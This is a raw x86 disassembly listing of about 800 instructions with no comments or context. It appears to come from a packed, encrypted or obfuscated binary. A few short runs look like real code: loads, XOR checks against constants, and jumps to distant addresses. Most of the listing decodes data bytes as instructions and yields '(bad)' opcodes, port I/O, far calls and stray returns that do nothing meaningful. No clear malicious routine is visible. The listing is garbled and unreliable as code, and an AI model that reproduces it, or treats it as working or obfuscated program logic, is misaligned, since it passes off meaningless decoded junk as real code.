  40fcb4:	push   ebx
  40fcb5:	lea    ebx,[ebx-0x2842fd82]
  40fcbb:	jns    0x40fc3d
  40fcbd:	cmc    
  40fcbe:	fs mov ebx,0x334655e5
  40fcc4:	rol    cl,cl
  40fcc6:	loopne 0x40fce6
  40fcc8:	or     edx,DWORD PTR [ebp+0x14]
  40fccb:	mov    DWORD PTR [ebp-0x28],edx
  40fcce:	mov    eax,DWORD PTR [ebp-0x24]
  40fcd1:	mov    eax,DWORD PTR [ebp-0x24]
  40fcd4:	xor    edx,edx
  40fcd6:	shld   edx,eax,0x2
  40fcda:	xor    edx,ecx
  40fcdc:	mov    DWORD PTR [ebp+0xc],edx
  40fcdf:	mov    edx,DWORD PTR [esi]
  40fce1:	shl    eax,0x2
  40fce4:	mov    DWORD PTR [ebp+0x10],edx
  40fce7:	mov    edx,DWORD PTR [esi+0x4]
  40fcea:	xor    eax,0xba699573
  40fcef:	mov    DWORD PTR [ebp+0x14],edx
  40fcf2:	cmp    eax,DWORD PTR [ebp+0x10]
  40fcf5:	jne    0x41195a
  40fcfb:	jmp    0x410285
  40fd00:	shl    BYTE PTR [eax-0x5b],0xd6
  40fd04:	and    eax,0x48609832
  40fd09:	and    dl,ah
  40fd0b:	test   al,0xfc
  40fd0d:	xor    eax,0x6a186838
  40fd12:	push   ss
  40fd13:	push   ss
  40fd14:	cmp    eax,0x9a161604
  40fd19:	mov    ebx,0x94231e61
  40fd1e:	je     0x40fd91
  40fd20:	or     DWORD PTR [edx-0x3743f49f],ecx
  40fd26:	add    DWORD PTR [esi+esi*1-0x3706de68],eax
  40fd2d:	mov    al,ds:0xd3c7388
  40fd32:	inc    ecx
  40fd33:	mov    ah,0xae
  40fd35:	retf   0x6f35
  40fd38:	cmp    eax,0x701a6ee6
  40fd3d:	jecxz  0x40fd7a
  40fd3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd40:	sar    sp,cl
  40fd43:	cli    
  40fd44:	scas   al,BYTE PTR es:[edi]
  40fd45:	clc    
  40fd46:	mov    bl,0x1a
  40fd48:	xor    cl,0x49
  40fd4b:	mov    bh,0x2f
  40fd4d:	add    ebp,DWORD PTR [eax]
  40fd4f:	xchg   ebx,eax
  40fd50:	mov    ebx,0xc36621ea
  40fd55:	in     al,dx
  40fd56:	jno    0x40fd92
  40fd58:	adc    ah,BYTE PTR [edi]
  40fd5a:	pop    esp
  40fd5b:	(bad)  
  40fd5c:	lahf   
  40fd5d:	mov    ?,WORD PTR [esi]
  40fd5f:	inc    ebp
  40fd60:	sbb    eax,0x81ce00b5
  40fd65:	jl     0x40fddb
  40fd67:	and    BYTE PTR [edi],dh
  40fd69:	pop    ebx
  40fd6a:	cmp    eax,0xda2708ee
  40fd6f:	sbb    BYTE PTR [edx-0x6c],al
  40fd72:	mov    al,0x6b
  40fd74:	aaa    
  40fd75:	ds mov bl,0xa0
  40fd78:	sub    edx,DWORD PTR [ebp-0x3597f2f7]
  40fd7e:	mov    ebx,0x3ee032a
  40fd83:	mov    cl,0x28
  40fd85:	stos   BYTE PTR es:[edi],al
  40fd86:	test   BYTE PTR [edi+0x65],ah
  40fd89:	daa    
  40fd8a:	dec    ebx
  40fd8b:	push   edx
  40fd8c:	pushf  
  40fd8d:	pop    ds
  40fd8e:	(bad)  
  40fd90:	pop    ebx
  40fd91:	adc    eax,0x31a70ed4
  40fd96:	call   0xa2f0354e
  40fd9b:	xor    DWORD PTR [edi-0x4c],0x60e6ad60
  40fda2:	xchg   esp,eax
  40fda3:	cmc    
  40fda4:	bsf    esi,DWORD PTR [ebx-0x7c962786]
  40fdab:	sbb    ecx,edi
  40fdad:	pop    esp
  40fdae:	adc    eax,0x56d5bf61
  40fdb3:	test   eax,0xcfd749c4
  40fdb8:	loopne 0x40fdf0
  40fdba:	(bad)  
  40fdbb:	push   ecx
  40fdbc:	ins    DWORD PTR es:[edi],dx
  40fdbd:	inc    edx
  40fdbe:	out    dx,eax
  40fdbf:	ficomp DWORD PTR [ebp+0x30]
  40fdc2:	dec    ebp
  40fdc3:	dec    edx
  40fdc4:	jp     0x40fd65
  40fdc6:	fnsave [eax+0x239ba218]
  40fdcc:	xchg   ebp,edx
  40fdce:	dec    esp
  40fdcf:	inc    edi
  40fdd0:	stc    
  40fdd1:	dec    bp
  40fdd3:	inc    edi
  40fdd4:	dec    ecx
  40fdd5:	(bad)  
  40fdd6:	fistp  WORD PTR [edx+esi*2-0x2fa3541e]
  40fddd:	pand   mm0,QWORD PTR [ebx+0x51d9a570]
  40fde4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fde5:	inc    ebp
  40fde6:	(bad)  
  40fde7:	shl    DWORD PTR [ecx-0xcdafa02],cl
  40fded:	sub    ch,BYTE PTR [eax]
  40fdef:	inc    eax
  40fdf0:	sub    eax,0x2c781a09
  40fdf5:	fidiv  DWORD PTR [ebp-0x24d5442f]
  40fdfb:	mov    WORD PTR [edi-0x7f71aa3a],ds
  40fe01:	loope  0x40fe10
  40fe03:	xor    esi,DWORD PTR [eax+0x5eb4aa8e]
  40fe09:	out    0x62,eax
  40fe0b:	mov    ebp,0xc467ea4d
  40fe10:	ja     0x40fe4b
  40fe12:	xchg   ebp,eax
  40fe13:	and    edx,esi
  40fe15:	psrld  mm0,QWORD PTR [edx]
  40fe18:	sbb    BYTE PTR [esi-0x328f9146],bl
  40fe1e:	push   esi
  40fe1f:	outs   dx,DWORD PTR ds:[esi]
  40fe20:	jle    0x40fe6c
  40fe22:	mov    al,ds:0xaf1b1bd4
  40fe27:	out    dx,eax
  40fe28:	(bad)  
  40fe2a:	jbe    0x40fdce
  40fe2c:	push   edx
  40fe2d:	push   ebx
  40fe2e:	cdq    
  40fe2f:	leave  
  40fe30:	add    esp,DWORD PTR [ecx]
  40fe32:	dec    eax
  40fe33:	sti    
  40fe34:	fbld   TBYTE PTR [eax-0x61f99d30]
  40fe3a:	sub    esi,DWORD PTR [ecx-0x73]
  40fe3d:	inc    edi
  40fe3e:	scas   eax,DWORD PTR es:[edi]
  40fe3f:	mov    WORD PTR ds:0xf0268ebe,?
  40fe45:	xchg   esi,eax
  40fe46:	and    eax,0xdb7b4a28
  40fe4b:	lods   al,BYTE PTR ds:[esi]
  40fe4c:	les    ebp,FWORD PTR ss:0x2ed13af
  40fe53:	call   0x5e2533f5
  40fe58:	in     al,0x6b
  40fe5a:	mov    ss,edi
  40fe5c:	sub    esp,esp
  40fe5e:	lods   al,BYTE PTR ds:[esi]
  40fe5f:	repz stc 
  40fe61:	adc    dh,ch
  40fe63:	div    DWORD PTR [ebx+ebp*8+0x3df69c2a]
  40fe6a:	mov    eax,0xe8399cf8
  40fe6f:	popa   
  40fe70:	cmp    bh,al
  40fe72:	ret    0x743c
  40fe75:	xchg   BYTE PTR [edi-0x6d28b5ee],al
  40fe7b:	adc    eax,0xf5adb4a1
  40fe80:	push   edi
  40fe81:	inc    edi
  40fe82:	push   esi
  40fe83:	and    esp,edi
  40fe85:	les    esi,FWORD PTR cs:[ecx]
  40fe88:	sbb    DWORD PTR [eax-0x32baa013],0xc42c1734
  40fe92:	bound  eax,QWORD PTR [esi]
  40fe94:	loopne 0x40fe6e
  40fe96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe97:	ins    BYTE PTR es:[edi],dx
  40fe98:	sbb    eax,0x5a200c00
  40fe9d:	and    bh,BYTE PTR [edx]
  40fe9f:	je     0x40ff0f
  40fea1:	mov    dh,0x55
  40fea3:	mov    dl,0xa3
  40fea5:	pop    eax
  40fea6:	ds jae 0x40fe3c
  40fea9:	add    eax,0xcc5cca33
  40feae:	aad    0x53
  40feb0:	scas   eax,DWORD PTR es:[edi]
  40feb1:	int    0x9f
  40feb3:	pop    ebx
  40feb4:	xchg   ebx,eax
  40feb5:	dec    esp
  40feb6:	mov    eax,0x13bb2d13
  40febb:	jno    0x40ff16
  40febd:	das    
  40febe:	add    eax,0xdfe02b1
  40fec3:	ret    
  40fec4:	mul    bh
  40fec6:	push   0xf204fb08
  40fecb:	cld    
  40fecc:	mov    bh,0xb3
  40fece:	mov    ds:0x278b15dc,eax
  40fed3:	dec    esp
  40fed4:	imul   edx,DWORD PTR [eax+0x159b02a5],0xffffffae
  40fedb:	inc    edi
  40fedc:	cld    
  40fedd:	adc    bl,al
  40fedf:	cmp    al,0x61
  40fee1:	fcmovbe st,st(7)
  40fee3:	cmp    al,0xa3
  40fee5:	sub    DWORD PTR [edx],ecx
  40fee7:	jno    0x40feea
  40fee9:	adc    edx,DWORD PTR [esi+0x1e]
  40feec:	arpl   WORD PTR [ecx+0x36e57178],si
  40fef2:	ds jo  0x40ff46
  40fef5:	test   BYTE PTR fs:[edx],dl
  40fef8:	mov    esp,0xa4e18ae2
  40fefd:	leave  
  40fefe:	pop    esi
  40feff:	imul   ecx,DWORD PTR fs:[ecx+0x2b],0xfffd3da3
  40ff07:	(bad)  
  40ff08:	stc    
  40ff09:	push   esi
  40ff0a:	retf   0x4771
  40ff0d:	add    edi,DWORD PTR [ebp+eiz*4-0x286824b9]
  40ff14:	push   ss
  40ff15:	add    edx,DWORD PTR [ecx+0x62]
  40ff18:	sub    BYTE PTR [edi],bh
  40ff1a:	iret   
  40ff1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff1c:	jae    0x40ff56
  40ff1e:	push   0x6a81af03
  40ff23:	sbb    bl,BYTE PTR [ebp-0x7d82d016]
  40ff29:	nop
  40ff2a:	jmp    0x76f09591
  40ff2f:	aas    
  40ff30:	ja     0x40fef5
  40ff32:	cmp    cl,BYTE PTR [ebx-0x1ec6c9c6]
  40ff38:	mov    ds:0xce4ba015,al
  40ff3d:	inc    esi
  40ff3e:	jle    0x40fec4
  40ff40:	push   ss
  40ff41:	pop    esp
  40ff42:	ja     0x40ffbb
  40ff44:	inc    eax
  40ff45:	jae    0x40ff5f
  40ff47:	dec    ecx
  40ff48:	cwde   
  40ff49:	ror    BYTE PTR [esp+esi*2+0x71],1
  40ff4d:	cmp    eax,0xb4da005f
  40ff52:	xchg   ecx,eax
  40ff53:	loop   0x40ff13
  40ff55:	mov    esi,0xb5cee284
  40ff5a:	neg    DWORD PTR [edx]
  40ff5c:	popf   
  40ff5d:	out    0x32,al
  40ff5f:	enter  0x44df,0xd6
  40ff63:	cmp    al,0xa8
  40ff65:	sbb    DWORD PTR [edi-0x35ae735d],esp
  40ff6b:	ja     0x40ff7a
  40ff6d:	mov    edx,0x5506624
  40ff72:	jp     0x40ffcf
  40ff74:	adc    DWORD PTR [ecx-0x4c],0xffffffd1
  40ff78:	push   es
  40ff79:	or     BYTE PTR [eax-0x67dfb8bb],ch
  40ff7f:	aas    
  40ff80:	and    eax,0x3f7a4289
  40ff85:	mov    ch,0x6e
  40ff87:	cs and eax,0xa68ac6a
  40ff8d:	jle    0x40ffa9
  40ff8f:	call   0xb7f2:0xd38a7cd7
  40ff96:	js     0x40ff51
  40ff98:	pop    ecx
  40ff99:	ins    DWORD PTR es:[edi],dx
  40ff9a:	(bad)  
  40ff9b:	(bad)  
  40ff9c:	sub    DWORD PTR [ebp+esi*4-0x78],ecx
  40ffa0:	int    0x57
  40ffa2:	xor    al,0x3e
  40ffa4:	push   eax
  40ffa5:	inc    eax
  40ffa6:	ret    0xa620
  40ffa9:	cdq    
  40ffaa:	dec    ebp
  40ffab:	test   eax,0x77d4df
  40ffb0:	(bad)
  40ffb3:	enter  0x8c85,0x4b
  40ffb7:	imul   esi,esi,0x52
  40ffba:	in     eax,dx
  40ffbb:	fsubr  QWORD PTR [edx-0xfcac2a6]
  40ffc1:	jmp    0x6fde:0x45234a1c
  40ffc8:	ins    DWORD PTR es:[edi],dx
  40ffc9:	push   si
  40ffcb:	call   0xdb0a:0x516724dc
  40ffd2:	outs   dx,DWORD PTR ds:[esi]
  40ffd3:	sti    
  40ffd4:	sub    al,0x5c
  40ffd6:	scas   eax,DWORD PTR es:[edi]
  40ffd7:	mov    ecx,0xda589131
  40ffdc:	jae    0x40ffea
  40ffde:	test   esi,0x96b4beef
  40ffe4:	dec    edi
  40ffe5:	jmp    eax
  40ffe7:	mov    eax,ds:0x452040cb
  40ffec:	dec    ebx
  40ffed:	and    dl,dl
  40ffef:	pop    ss
  40fff0:	cmp    al,0x94
  40fff2:	xchg   esp,eax
  40fff3:	popa   
  40fff4:	adc    ecx,ebp
  40fff6:	add    bh,BYTE PTR [ecx+0x116e06e8]
  40fffc:	mov    WORD PTR [eax+eax*1-0x65],cs
  410000:	sbb    BYTE PTR [edi+0x5c2cb64],ch
  410006:	mov    dh,0x4b
  410008:	call   FWORD PTR [ebx-0x54c8312d]
  41000e:	xchg   esp,eax
  41000f:	and    dl,cl
  410011:	shl    DWORD PTR [ecx-0xdf86f6c],1
  410017:	sbb    eax,0x236a1785
  41001c:	lds    edx,FWORD PTR [edi-0x1f]
  41001f:	mov    al,0x3
  410021:	imul   ebx,DWORD PTR [ebp-0x4d],0xffffffc5
  410025:	add    eax,0xb808e332
  41002a:	xor    eax,0xdac680c9
  41002f:	or     ecx,ecx
  410031:	or     BYTE PTR [ebx+esi*4+0x60],cl
  410035:	lods   al,BYTE PTR ds:[esi]
  410037:	mov    ds:0x39f14a0a,eax
  41003c:	in     al,dx
  41003d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41003e:	aad    0xa2
  410040:	push   esp
  410041:	or     eax,0x8e416d40
  410046:	push   ecx
  410047:	dec    ecx
  410048:	mov    bl,0xa4
  41004a:	cwde   
  41004b:	jle    0x410010
  41004d:	xchg   ebx,eax
  41004e:	aaa    
  41004f:	div    esp
  410051:	imul   esi,DWORD PTR [eax-0x69],0x6e
  410055:	(bad)  
  410056:	ins    BYTE PTR es:[edi],dx
  410057:	xor    BYTE PTR [ecx],al
  410059:	sar    BYTE PTR [edi],1
  41005b:	jge    0x40fff4
  41005d:	jnp    0x4100c4
  41005f:	inc    ebp
  410060:	or     al,0xdd
  410062:	imul   eax,DWORD PTR [ebx-0x37c296f2],0x2d91d17a
  41006c:	jno    0x41003e
  41006e:	fisubr DWORD PTR ds:0x53aae74d
  410074:	sbb    BYTE PTR [edx+0x25dcbe68],al
  41007a:	jge    0x41003b
  41007c:	or     al,0x19
  41007e:	loop   0x4100bb
  410080:	iret   
  410081:	shl    DWORD PTR [esi+0x1153c72c],0xae
  410088:	lock stc 
  41008a:	call   0x3d35:0x387c9f05
  410091:	sbb    esi,DWORD PTR [eax-0x2d]
  410094:	repz add DWORD PTR [edx+0x91f4c76],0xffffffcb
  41009c:	xchg   BYTE PTR [ebx+eiz*2+0x29e5039e],bl
  4100a3:	push   es
  4100a4:	les    ebx,FWORD PTR [ecx-0x2b]
  4100a7:	push   ebp
  4100a8:	inc    ecx
  4100a9:	retf   
  4100aa:	add    DWORD PTR [ecx+eiz*8],eax
  4100ad:	and    ecx,DWORD PTR [ecx+eax*8]
  4100b0:	sub    bh,al
  4100b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100b3:	xor    al,BYTE PTR ds:0xc169b27
  4100b9:	mov    dh,0x26
  4100bb:	scas   al,BYTE PTR es:[edi]
  4100bc:	stos   BYTE PTR es:[edi],al
  4100bd:	jb     0x4100aa
  4100bf:	sub    DWORD PTR [edx+0x13009730],ebx
  4100c5:	aad    0x38
  4100c7:	sub    ch,BYTE PTR [esi+0x5b6e2ad5]
  4100cd:	enter  0x85c2,0xfd
  4100d1:	dec    cx
  4100d3:	mov    esp,0x17b82835
  4100d8:	fstp   QWORD PTR [ebx-0x773be54a]
  4100de:	xor    al,0xbf
  4100e0:	stos   DWORD PTR es:[edi],eax
  4100e1:	(bad)  
  4100e2:	enter  0x3c62,0x2b
  4100e6:	and    DWORD PTR [edx],edx
  4100e8:	(bad)  
  4100e9:	lahf   
  4100ea:	rol    DWORD PTR [edx-0x4c876c69],cl
  4100f0:	xchg   ah,cl
  4100f2:	lea    eax,[edi]
  4100f4:	xlat   BYTE PTR ds:[ebx]
  4100f5:	out    0x4,eax
  4100f7:	and    edx,esp
  4100f9:	sub    al,bh
  4100fb:	adc    cl,BYTE PTR [edx-0x1ccf2b6a]
  410101:	loope  0x410118
  410103:	inc    esi
  410104:	jnp    0x410125
  410106:	pop    eax
  410107:	pop    esp
  410108:	push   ebx
  410109:	pop    es
  41010a:	or     edi,DWORD PTR [ebp+0x75ddf082]
  410110:	mov    esi,0xfa12374e
  410115:	xchg   esp,eax
  410116:	sub    edx,eax
  410118:	xchg   edi,eax
  410119:	pop    ds
  41011a:	test   DWORD PTR [esi-0x31],0x4a9b75d
  410121:	pop    esp
  410122:	idiv   DWORD PTR [ebx+ebx*4+0x486e6198]
  410129:	cdq    
  41012a:	aam    0x38
  41012c:	stos   DWORD PTR es:[edi],eax
  41012d:	add    bl,BYTE PTR [edi-0x2d]
  410130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410131:	jmp    0x4100d5
  410133:	cmp    al,BYTE PTR [esp+edi*8-0xf]
  410137:	pop    ecx
  410138:	jnp    0x410135
  41013a:	loope  0x410118
  41013c:	add    al,0xd
  41013e:	repnz cdq 
  410140:	jnp    0x4101af
  410142:	pop    es
  410143:	test   DWORD PTR [ecx-0x5d],0xfd8425c5
  41014a:	sub    BYTE PTR [ebx+0x69],cl
  41014d:	sub    eax,0x39465d55
  410152:	inc    esp
  410153:	loop   0x4101b1
  410155:	push   esi
  410156:	loope  0x41019c
  410158:	cmp    eax,0xffffffaf
  41015b:	jmp    0x410125
  41015d:	mov    ebp,0x4f61b816
  410162:	imul   esp,DWORD PTR [ebx+0x24],0x21
  410166:	cmp    DWORD PTR [ebx+ecx*4-0x70f78cdc],edx
  41016d:	adc    al,dh
  41016f:	retf   
  410170:	imul   esp,DWORD PTR [edx-0x4f],0x17edd3db
  410177:	xor    edx,ebx
  410179:	mul    DWORD PTR [edx-0x5a4ecfe]
  41017f:	retfw  
  410181:	and    BYTE PTR [ebx],ah
  410183:	mov    ch,0x17
  410185:	fucomip st,st(7)
  410187:	popf   
  410188:	pop    ebx
  410189:	outs   dx,BYTE PTR ds:[esi]
  41018a:	enter  0xdf0a,0x60
  41018e:	lods   al,BYTE PTR ds:[esi]
  41018f:	sub    BYTE PTR [ecx+0x66913de9],dl
  410195:	mov    al,BYTE PTR [ebx+0x33326f0d]
  41019b:	popf   
  41019c:	call   0x279e:0x2955bf03
  4101a3:	aaa    
  4101a4:	xor    eax,0x13187d95
  4101a9:	mov    ah,0xef
  4101ab:	lahf   
  4101ac:	repz xor eax,0x2ec76349
  4101b2:	in     eax,0xc5
  4101b4:	dec    edi
  4101b5:	movups xmm2,xmm2
  4101b8:	and    BYTE PTR [edi+esi*2-0x454673e],0xe4
  4101c0:	loop   0x410189
  4101c2:	and    BYTE PTR [esi+0x51],cl
  4101c5:	int3   
  4101c6:	push   esi
  4101c7:	retf   
  4101c8:	in     al,0xa3
  4101ca:	cmp    DWORD PTR [ecx+0xf],0x3e7d31fb
  4101d1:	pop    ecx
  4101d2:	cmp    DWORD PTR [ecx+0x6bb7d0dc],0x6ad3818b
  4101dc:	in     eax,0xe8
  4101de:	(bad)  
  4101df:	dec    edi
  4101e0:	test   BYTE PTR [ebx-0x455061f5],0x5a
  4101e7:	push   esi
  4101e8:	in     al,0xea
  4101ea:	mov    bl,0xd6
  4101ec:	dec    edi
  4101ed:	dec    ebx
  4101ee:	je     0x410179
  4101f0:	pop    esi
  4101f1:	sbb    al,dl
  4101f3:	mov    bh,0x48
  4101f5:	ret    0x47b0
  4101f8:	pop    ss
  4101f9:	imul   esp,DWORD PTR [edi],0xffffffbc
  4101fc:	inc    edx
  4101fd:	imul   edi,DWORD PTR [ecx-0x48],0x7cca9f91
  410204:	jge    0x410257
  410206:	clc    
  410207:	popf   
  410208:	sbb    dh,bh
  41020a:	add    esi,esp
  41020c:	out    dx,eax
  41020d:	jb     0x4101ae
  41020f:	dec    edx
  410210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410211:	dec    esi
  410212:	fld    QWORD PTR [ebp-0x5ff53642]
  410218:	sub    bl,bh
  41021a:	ret    
  41021b:	and    bl,cl
  41021d:	cwde   
  41021e:	test   DWORD PTR [edx],ecx
  410220:	xor    ah,bh
  410222:	arpl   WORD PTR [esi-0xc4d6f2],sp
  410228:	jbe    0x41027c
  41022a:	jg     0x410226
  41022c:	daa    
  41022d:	lods   eax,DWORD PTR ds:[esi]
  41022e:	lahf   
  41022f:	sti    
  410230:	mov    ebp,0x7ad5553d
  410235:	jo     0x410271
  410237:	inc    edi
  410238:	ret    0x1aea
  41023b:	and    ch,ah
  41023d:	cdq    
  41023e:	dec    ebx
  41023f:	and    DWORD PTR [ebx-0x75ac7882],0x5d2a95c9
  410249:	pop    edx
  41024a:	mov    dl,0x69
  41024c:	cmc    
  41024d:	scas   al,BYTE PTR es:[edi]
  41024e:	mov    al,ds:0xb4a522dc
  410253:	ds mov cl,0x5a
  410256:	loope  0x41028d
  410258:	cld    
  410259:	inc    eax
  41025a:	sbb    DWORD PTR [ecx-0x2],eax
  41025d:	fld    TBYTE PTR [edi-0x30f52bcd]
  410263:	jnp    0x410249
  410265:	outs   dx,DWORD PTR ds:[esi]
  410266:	inc    eax
  410267:	in     al,0x47
  410269:	in     al,dx
  41026a:	inc    ecx
  41026b:	jb     0x4102db
  41026d:	js     0x41029b
  41026f:	fisubr WORD PTR [ebp+0x767d2f77]
  410275:	scas   al,BYTE PTR es:[edi]
  410276:	in     eax,dx
  410277:	jne    0x41027b
  410279:	or     edi,esi
  41027b:	dec    ecx
  41027c:	out    dx,eax
  41027d:	adc    DWORD PTR [eax+0x1e],ebp
  410280:	addr16 arpl ax,bp
  410283:	gs loop 0x410211
  410286:	ret    0x4539
  410289:	or     al,0xf
  41028b:	test   edx,ecx
  41028d:	push   ss
  41028e:	add    BYTE PTR [eax],al
  410290:	mov    eax,DWORD PTR [esi]
  410292:	mov    edx,DWORD PTR [esi+0x4]
  410295:	mov    eax,DWORD PTR [esi]
  410297:	mov    edx,DWORD PTR [esi+0x4]
  41029a:	mov    edx,eax
  41029c:	jmp    0x410826
  4102a1:	shr    esi,cl
  4102a3:	ror    dh,cl
  4102a5:	shl    BYTE PTR [edx-0x1e636d6d],cl
  4102ab:	loopne 0x410321
  4102ad:	pop    edx
  4102ae:	jecxz  0x41026c
  4102b0:	scas   al,BYTE PTR es:[edi]
  4102b1:	inc    edi
  4102b2:	pushw  ss
  4102b4:	push   ss
  4102b5:	cmp    eax,0x28161604
  4102ba:	test   BYTE PTR [ebx-0x507c39d3],cl
  4102c0:	push   esp
  4102c1:	inc    edx
  4102c2:	test   al,0xfd
  4102c4:	scas   eax,DWORD PTR es:[edi]
  4102c5:	mov    cl,0x5c
  4102c7:	cmp    BYTE PTR [ecx+0x1b],0x10
  4102cb:	cmp    ecx,ecx
  4102cd:	sbb    dh,BYTE PTR [eax-0x138bd042]
  4102d3:	(bad)  
  4102d4:	popa   
  4102d5:	(bad)  
  4102d6:	sub    al,0xb6
  4102d8:	stc    
  4102d9:	xor    dh,al
  4102db:	sti    
  4102dc:	push   cs
  4102dd:	dec    ebp
  4102de:	mov    es,esp
  4102e0:	aas    
  4102e1:	mov    esi,0x855e2b2a
  4102e6:	call   0x44e8:0x318b
  4102ec:	addr16 leave 
  4102ee:	mov    ecx,0x6e18336f
  4102f3:	adc    ebp,ebp
  4102f5:	outs   dx,BYTE PTR ds:[esi]
  4102f6:	int    0xf4
  4102f8:	xchg   edi,eax
  4102f9:	pop    ss
  4102fa:	xchg   DWORD PTR [edx-0xe],eax
  4102fd:	push   esp
  4102fe:	pushf  
  4102ff:	mov    bl,0x92
  410301:	call   FWORD PTR [eax+0x4d]
  410304:	dec    ebp
  410305:	pushf  
  410306:	sbb    al,0xeb
  410308:	in     al,0x26
  41030a:	arpl   WORD PTR [ecx+0x4],di
  41030d:	repz bound esp,QWORD PTR [edi+ecx*1]
  410311:	and    BYTE PTR [edi+0x18],dh
  410314:	cmp    dh,BYTE PTR [edi+edx*2-0x2cb3cb8]
  41031b:	iret   
  41031c:	pusha  
  41031d:	add    ch,BYTE PTR [esi]
  41031f:	pop    eax
  410320:	stos   BYTE PTR es:[edi],al
  410321:	(bad)  
  410322:	mov    DWORD PTR [edx],ebp
  410324:	repnz stos BYTE PTR es:[edi],al
  410326:	mov    edi,0xc9b72249
  41032b:	mov    dl,0x78
  41032d:	xchg   DWORD PTR ds:0xa6890d93,ecx
  410333:	push   edi
  410334:	(bad)  
  410335:	arpl   dx,si
  410337:	lods   al,BYTE PTR ds:[esi]
  410338:	xchg   esp,ebp
  41033a:	mov    ah,0x42
  41033c:	and    al,0xf6
  41033e:	mov    bh,0xd2
  410340:	es jno 0x410371
  410343:	or     eax,0x850a89cc
  410348:	add    al,0xf4
  41034a:	addr16 xchg ebp,eax
  41034c:	sub    edi,DWORD PTR [eax+0x63df074a]
  410352:	aad    0x8a
  410354:	hlt    
  410355:	and    eax,0xe2d29d61
  41035a:	xchg   edi,eax
  41035b:	mov    cl,0x23
  41035d:	and    al,BYTE PTR [edx+0x5b]
  410360:	or     al,0x99
  410362:	into   
  410363:	dec    eax
  410364:	in     al,0x2a
  410366:	and    BYTE PTR [ecx+esi*4],0xfc
  41036a:	in     al,0x1c
  41036c:	std    
  41036d:	out    0x73,eax
  41036f:	lds    eax,FWORD PTR [esi]
  410371:	into   
  410372:	jmp    DWORD PTR [edx-0x6b]
  410375:	add    BYTE PTR [edx-0x70ac2f4d],bh
  41037b:	call   0x4506:0x7eb42eeb
  410382:	gs cmp eax,0x70303439
  410388:	adc    ch,0x49
  41038b:	xor    edx,edi
  41038d:	inc    eax
  41038e:	inc    edi
  41038f:	and    DWORD PTR [edx+0x34],ebp
  410392:	push   ds
  410393:	ret    
  410394:	fst    DWORD PTR [ebx]
  410396:	inc    esp
  410397:	or     BYTE PTR [eax+eiz*2],cl
  41039a:	repz out dx,al
  41039c:	pop    eax
  41039d:	stos   BYTE PTR es:[edi],al
  41039e:	push   0x4d4f7199
  4103a3:	fiadd  DWORD PTR [edi+0x352b8ff4]
  4103a9:	add    bl,al
  4103ab:	xchg   edx,eax
  4103ac:	iret   
  4103ad:	ret    
  4103ae:	retf   
  4103af:	mov    eax,ds:0x9d129147
  4103b4:	neg    DWORD PTR [eax]
  4103b6:	loop   0x4103f4
  4103b8:	out    0xf7,eax
  4103ba:	and    dl,BYTE PTR [ebx+0x64]
  4103bd:	or     dl,al
  4103bf:	pop    ds
  4103c0:	lods   al,BYTE PTR ds:[esi]
  4103c1:	rcl    dl,1
  4103c3:	pop    eax
  4103c4:	xor    BYTE PTR [ebp-0x1f30469],0x12
  4103cb:	mov    esi,DWORD PTR [eax+0x77]
  4103ce:	mov    esi,0xd8d4fe0a
  4103d3:	fidiv  DWORD PTR [ecx-0x3c0e864a]
  4103d9:	or     DWORD PTR ss:[ebx+0x2c],esi
  4103dd:	fs lock test esp,ebp
  4103e1:	ja     0x410399
  4103e3:	push   ss
  4103e4:	daa    
  4103e5:	ins    DWORD PTR es:[edi],dx
  4103e6:	add    DWORD PTR [esi],0xffffffda
  4103e9:	imul   ebp,DWORD PTR [ebx],0xffffffcc
  4103ec:	out    dx,eax
  4103ed:	or     al,0x1d
  4103ef:	fsub   QWORD PTR [edx+edi*2-0x750f198a]
  4103f6:	xchg   edx,eax
  4103f7:	xor    al,0x27
  4103f9:	xchg   ecx,eax
  4103fa:	adc    eax,0xffd9cbe2
  4103ff:	add    al,0x19
  410401:	inc    edi
  410402:	(bad)  
  410403:	mov    dh,0xf0
  410405:	cwde   
  410406:	sub    BYTE PTR [esp+esi*8-0x28],0xb4
  41040b:	dec    edx
  41040c:	inc    ebp
  41040d:	or     ah,BYTE PTR [ebx-0x80]
  410410:	adc    BYTE PTR [eax+0x30],al
  410413:	push   edx
  410414:	retf   0x237
  410417:	addr16 pop ds
  410419:	ror    ebx,1
  41041b:	(bad)  
  41041c:	xor    edi,DWORD PTR [eax]
  41041e:	pop    esi
  41041f:	jmp    0x2295:0xc56a5b27
  410426:	scas   eax,DWORD PTR es:[edi]
  410427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410428:	add    bl,0x40
  41042b:	popa   
  41042c:	add    BYTE PTR [edx-0x2e],dl
  41042f:	xchg   DWORD PTR [ebx],eax
  410431:	xor    dl,cl
  410433:	mov    esi,0xdc011093
  410438:	sub    DWORD PTR [ebp+0x64],0x56
  41043c:	in     eax,0xc3
  41043e:	cli    
  41043f:	rcl    ch,1
  410441:	scas   eax,DWORD PTR es:[edi]
  410442:	ja     0x4103ff
  410444:	mov    ch,BYTE PTR [ebx-0x4dd9d70e]
  41044a:	sbb    al,0x52
  41044c:	icebp  
  41044d:	mov    edi,0x49753c6d
  410452:	out    dx,eax
  410453:	mov    ecx,0x23301fdc
  410458:	enter  0xb1df,0xc7
  41045c:	cmp    al,bl
  41045e:	pop    ecx
  41045f:	ret    0xbc93
  410462:	in     al,0x86
  410464:	adc    al,0x1e
  410466:	es (bad) 
  410468:	ins    BYTE PTR es:[edi],dx
  410469:	add    BYTE PTR [ecx-0x7d92713d],dl
  41046f:	push   esi
  410470:	not    bh
  410472:	cmp    al,bh
  410474:	stos   DWORD PTR es:[edi],eax
  410475:	mov    dh,0x35
  410477:	jno    0x4104ba
  410479:	sub    ch,dl
  41047b:	mov    edi,0x5da44940
  410480:	mov    ch,0x5c
  410482:	push   ebx
  410483:	sbb    BYTE PTR [esi+eax*8-0x3b],cl
  410487:	push   esi
  410488:	arpl   WORD PTR [esp+esi*2-0x1b],si
  41048c:	daa    
  41048d:	enter  0xce75,0x60
  410491:	mov    ds:0xed4ff7ac,al
